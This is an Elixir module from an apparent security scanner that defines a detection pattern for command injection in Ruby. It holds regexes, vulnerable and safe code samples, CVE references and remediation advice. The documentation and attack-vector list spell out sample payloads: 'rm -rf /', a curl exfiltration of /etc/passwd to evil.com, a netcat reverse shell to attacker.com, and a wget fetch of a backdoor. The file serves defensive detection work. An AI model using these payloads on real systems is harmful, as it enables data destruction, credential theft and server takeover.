defmodule RsolvApi.Security.Patterns.Ruby.CommandInjection do
  @moduledoc """
  Pattern for detecting command injection vulnerabilities in Ruby applications.
  
  This pattern identifies when user input is directly interpolated into shell commands,
  allowing attackers to execute arbitrary operating system commands on the server.
  Command injection is one of the most severe security vulnerabilities as it provides
  direct access to the underlying system.
  
  ## Vulnerability Details
  
  Command injection occurs when applications execute shell commands using user-controlled
  input without proper validation or sanitization. Ruby provides several ways to execute
  system commands, and all become dangerous when combined with string interpolation:
  
  - **Direct System Access**: Attackers can execute any OS command
  - **Privilege Escalation**: Commands run with application privileges
  - **Data Exfiltration**: Access to file system and network resources
  - **System Compromise**: Full server control in severe cases
  
  ### Attack Example
  ```ruby
  # Vulnerable command execution
  class FileController < ApplicationController
    def download
      filename = params[:file]  # User input: "file.txt; rm -rf /"
      
      # VULNERABLE: Direct interpolation into system command
      system("cat \#{filename}")
      # Results in: cat file.txt; rm -rf /
      
      # VULNERABLE: Backtick execution
      content = `head -10 \#{filename}`
      # Attack: filename = "file.txt; curl evil.com/steal?data=$(cat /etc/passwd)"
    end
  end
  
  # Attack result: Complete system compromise
  ```
  """
  
  use RsolvApi.Security.Patterns.PatternBase
  alias RsolvApi.Security.Pattern
  
  @impl true
  def pattern do
    %Pattern{
      id: "ruby-command-injection",
      name: "Command Injection",
      description: "Detects shell command execution with user input",
      type: :command_injection,
      severity: :critical,
      languages: ["ruby"],
      regex: [
        ~r/system\s*\(\s*['\"].*?#\{/,
        ~r/`.*?#\{.*?`/,
        ~r/exec\s*\(\s*['\"].*?#\{/,
        ~r/%x[{[\]()}\/].*?#\{/,
        ~r/IO\.popen\s*\(\s*['\"].*?#\{/,
        ~r/Open3\.\w+\s*\(\s*['\"].*?#\{/,
        ~r/Kernel\.system\s*\(\s*['\"].*?#\{/,
        ~r/Kernel\.exec\s*\(\s*['\"].*?#\{/,
        ~r/spawn\s*\(\s*['\"].*?#\{/
      ],
      default_tier: :ai,
      cwe_id: "CWE-78",
      owasp_category: "A03:2021",
      recommendation: "Use array form of system calls or shellescape user input",
      test_cases: %{
        vulnerable: [
          ~S|system("ls #{params[:dir]}")|,
          ~S|`cat #{filename}`|,
          ~S|exec("rm -rf #{path}")|,
          ~S|%x{ls #{dir}}|,
          ~S|IO.popen("cat #{file}")|,
          ~S|Open3.capture2("ls #{dir}")|
        ],
        safe: [
          ~S|system("ls", params[:dir])|,
          ~S|system("cat", Shellwords.escape(filename))|,
          ~S|Open3.capture2("ls", "-la", dir)|,
          ~S|exec("static_command")|,
          ~S|`static command`|
        ]
      }
    }
  end
  
  @impl true
  def vulnerability_metadata do
    %{
      description: """
      Command injection is a critical security vulnerability that occurs when an application
      passes unsafe user input to a system shell. In Ruby applications, this typically
      happens when developers use string interpolation to build shell commands dynamically.
      
      **How Command Injection Works:**
      Ruby provides several mechanisms for executing system commands:
      - `system()` - Executes command and returns success/failure
      - Backticks (``) - Executes command and returns output
      - `exec()` - Replaces current process with command
      - `%x{}` - Alternative syntax for backticks
      - `IO.popen()` - Opens pipe to command for reading/writing
      - `Open3` methods - Advanced command execution with streams
      
      **Why String Interpolation is Dangerous:**
      When user input is interpolated into command strings, shell metacharacters
      become executable. Common dangerous characters include:
      - `;` (command separator)
      - `&&` and `||` (conditional execution)
      - `|` (pipe)
      - `$()` and `` (command substitution)
      - `>` and `<` (redirection)
      - `&` (background execution)
      
      **Common Attack Patterns:**
      - **Command chaining**: `; rm -rf /` to execute destructive commands
      - **Command substitution**: `$(cat /etc/passwd)` to extract sensitive data
      - **Pipe injection**: `| mail attacker@evil.com` to exfiltrate data
      - **Background execution**: `& nc -e /bin/bash attacker.com 4444` for reverse shells
      - **Redirection attacks**: `> /dev/null; wget evil.com/backdoor` to hide malicious activity
      
      **Real-World Impact:**
      Command injection vulnerabilities have been responsible for numerous high-profile
      security incidents, including the CVE-2021-31799 RDoc vulnerability that allowed
      arbitrary command execution through malicious Ruby projects.
      """,
      references: [
        %{
          type: :cwe,
          id: "CWE-78",
          title: "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
          url: "https://cwe.mitre.org/data/definitions/78.html"
        },
        %{
          type: :owasp,
          id: "A03:2021",
          title: "OWASP Top 10 2021 - A03 Injection",
          url: "https://owasp.org/Top10/A03_2021-Injection/"
        },
        %{
          type: :research,
          id: "stackhawk_command_injection",
          title: "Command Injection in Ruby: Examples and Prevention",
          url: "https://www.stackhawk.com/blog/command-injection-ruby/"
        },
        %{
          type: :research,
          id: "owasp_command_injection_defense",
          title: "OWASP OS Command Injection Defense Cheat Sheet",
          url: "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html"
        },
        %{
          type: :research,
          id: "owasp_rails_cheatsheet",
          title: "OWASP Ruby on Rails Cheat Sheet - Command Injection",
          url: "https://cheatsheetseries.owasp.org/cheatsheets/Ruby_on_Rails_Cheat_Sheet.html#command-injection"
        }
      ],
      attack_vectors: [
        "Command chaining: userInput = 'file.txt; rm -rf /' to execute multiple commands",
        "Command substitution: userInput = '$(whoami)' to extract system information",
        "Pipe injection: userInput = 'file.txt | mail attacker@evil.com' to exfiltrate data",
        "Redirection attacks: userInput = 'file.txt > /dev/null; wget backdoor' to hide malicious activity",
        "Background execution: userInput = 'file.txt & nc -e /bin/bash attacker.com 4444' for reverse shells",
        "Environment variable injection: userInput = 'file.txt; export EVIL=payload' to modify environment",
        "Time-based attacks: userInput = 'file.txt; sleep 10' to confirm vulnerability",
        "Error-based information disclosure: userInput = 'nonexistent; ls /' to probe file system",
        "Conditional execution: userInput = 'file.txt && curl evil.com' to chain commands",
        "Comment injection: userInput = 'file.txt # ignore rest' to bypass validation"
      ],
      real_world_impact: [
        "CVE-2021-31799: RDoc command injection allowed arbitrary command execution in Ruby environments",
        "CVE-2017-17405: Net::FTP command injection in Ruby standard library",
        "CVE-2019-16255: Shell injection vulnerability in Ruby's shell library",
        "CVE-2022-25765: PDFKit Ruby gem command injection affecting PDF generation",
        "GitHub CodeQL security research: Command injection in Ruby web frameworks",
        "Rails application breaches: Command injection through file upload functionality",
        "Server compromises: Full system access through vulnerable Ruby applications",
        "Container escapes: Command injection leading to host system access in containerized environments"
      ],
      cve_examples: [
        %{
          id: "CVE-2021-31799",
          description: "Command injection in RDoc allowing arbitrary command execution",
          severity: "critical",
          cvss: 9.8,
          note: "Malicious Ruby projects could exploit RDoc to execute arbitrary commands"
        },
        %{
          id: "CVE-2017-17405", 
          description: "Command injection in Net::FTP through file operations",
          severity: "high",
          cvss: 7.5,
          note: "Kernel#open usage in Net::FTP enabled command injection via pipe character"
        },
        %{
          id: "CVE-2019-16255",
          description: "Code injection in Shell library methods",
          severity: "high",
          cvss: 8.1,
          note: "Shell#[] and Shell#test methods vulnerable to code injection"
        },
        %{
          id: "CVE-2022-25765",
          description: "Command injection in PDFKit Ruby gem",
          severity: "critical",
          cvss: 9.8,
          note: "URL parameter injection allowed arbitrary command execution during PDF generation"
        }
      ],
      detection_notes: """
      This pattern detects command injection by looking for Ruby command execution
      methods combined with string interpolation:
      
      **System Command Methods:**
      - system() with interpolated strings
      - Backtick operator (``) with interpolated variables
      - exec() calls with dynamic command construction
      - %x{} percent notation with interpolation
      
      **Advanced Command Execution:**
      - IO.popen() with interpolated command strings
      - Open3 module methods (capture2, capture3, popen3, etc.)
      - Kernel.system and Kernel.exec explicit calls
      - spawn() method with string interpolation
      
      **False Positive Considerations:**
      - Static commands without user input (lower risk)
      - Commands using array form (system(['cmd', 'arg']) - safer)
      - Properly escaped input using Shellwords.escape()
      - Commands in test files (excluded by AST enhancement)
      
      **Detection Limitations:**
      - Complex string building across multiple lines
      - Dynamic method calls or metaprogramming
      - Commands built through method chaining
      """,
      safe_alternatives: [
        "Array form: system('ls', params[:dir]) instead of system(\"ls \#{params[:dir]}\")",
        "Shell escaping: system(\"ls \#{Shellwords.escape(params[:dir])}\")",
        "Input validation: Validate params[:dir] against allowlist before use",
        "Built-in libraries: Use File and Dir methods instead of shell commands",
        "Open3 with arrays: Open3.capture2(['ls', '-la', dir]) for safe execution",
        "Subprocess restrictions: Use Process.spawn with specific environment restrictions",
        "Command whitelisting: Only allow pre-approved commands and arguments",
        "Container isolation: Run commands in isolated containers or sandboxes"
      ],
      additional_context: %{
        common_mistakes: [
          "Believing that input validation elsewhere makes command injection safe",
          "Using single quotes thinking they prevent interpolation (they don't with \#{})",
          "Assuming certain characters or inputs are 'safe' for command execution",
          "Relying on client-side validation to prevent malicious input",
          "Using shell escaping incorrectly or inconsistently",
          "Concatenating strings instead of interpolation (equally dangerous)",
          "Thinking that internal/admin interfaces don't need protection"
        ],
        secure_patterns: [
          "system('command', 'arg1', 'arg2') # Array form prevents shell interpretation",
          "Open3.capture2(['git', 'clone', repo_url]) # Safe argument passing", 
          "Shellwords.escape(user_input) # Proper escaping when shell features needed",
          "File.read(filename) # Use Ruby libraries instead of shell commands",
          "Dir.entries(directory) # Native Ruby methods for file operations",
          "URI.parse(url) # Validate URLs before using in commands"
        ],
        ruby_specific: %{
          dangerous_methods: [
            "system(string) - Direct shell execution",
            "`command` - Backtick execution with output capture",
            "exec(string) - Process replacement",
            "%x{command} - Alternative backtick syntax",
            "IO.popen(command) - Pipe to command",
            "Open3.* methods with string commands",
            "Kernel.system/exec - Explicit kernel calls"
          ],
          safe_alternatives: [
            "system(command, *args) - Array form bypasses shell",
            "File/Dir methods - Ruby built-ins for file operations",
            "Net::HTTP - Ruby HTTP client instead of curl",
            "JSON.parse - Built-in parsing instead of shell tools",
            "Shellwords.escape - Proper escaping when shell needed"
          ],
          ruby_versions: [
            "All Ruby versions affected by basic command injection",
            "Ruby 2.4+ includes improvements to Open3 safety",
            "Recent versions have better documentation about safe practices"
          ]
        }
      }
    }
  end
  
  @doc """
  Returns AST enhancement rules to reduce false positives.
  
  This enhancement helps distinguish between actual command injection vulnerabilities
  and safe command execution practices.
  
  ## Examples
  
      iex> enhancement = RsolvApi.Security.Patterns.Ruby.CommandInjection.ast_enhancement()
      iex> Map.keys(enhancement) |> Enum.sort()
      [:ast_rules, :confidence_rules, :context_rules, :min_confidence]
      
      iex> enhancement = RsolvApi.Security.Patterns.Ruby.CommandInjection.ast_enhancement()
      iex> enhancement.min_confidence
      0.7
  """
  @impl true
  def ast_enhancement do
    %{
      ast_rules: %{
        node_type: "CallExpression",
        method_names: [
          "system", "exec", "spawn", "popen", "capture2", "capture3", 
          "popen2", "popen2e", "popen3", "pipeline"
        ],
        receiver_analysis: %{
          check_kernel_context: true,
          modules: ["Kernel", "IO", "Open3", "Process"],
          check_backtick_operator: true
        },
        argument_analysis: %{
          check_string_interpolation: true,
          detect_array_form: true,
          interpolation_pattern: ~r/#\{[^}]+\}/,
          command_indicators: ["system", "shell", "command", "cmd", "exec"]
        }
      },
      context_rules: %{
        exclude_paths: [
          ~r/test/,
          ~r/spec/,
          ~r/fixtures/,
          ~r/examples/,
          ~r/rake/,
          ~r/script/
        ],
        check_shell_context: true,
        safe_functions: [
          "Shellwords.escape", "Shellwords.shellescape", "Shellwords.join",
          "File.basename", "File.dirname", "File.expand_path"
        ],
        dangerous_sources: [
          "params", "request", "cookies", "session", "ENV",
          "gets", "ARGV", "user_input", "form_data", "query"
        ],
        command_execution_patterns: %{
          array_form_safe: true,
          string_form_dangerous: true,
          check_argument_count: true,
          require_interpolation_for_danger: true
        }
      },
      confidence_rules: %{
        base: 0.6,
        adjustments: %{
          "contains_user_input" => 0.4,
          "uses_interpolation" => 0.3,
          "dangerous_method" => 0.2,
          "shell_metacharacters" => 0.3,
          "uses_array_form" => -0.8,
          "uses_shellwords" => -0.9,
          "static_command_only" => -0.7,
          "in_test_code" => -1.0,
          "proper_escaping" => -0.8,
          "whitelisted_command" => -0.6
        }
      },
      min_confidence: 0.7
    }
  end
end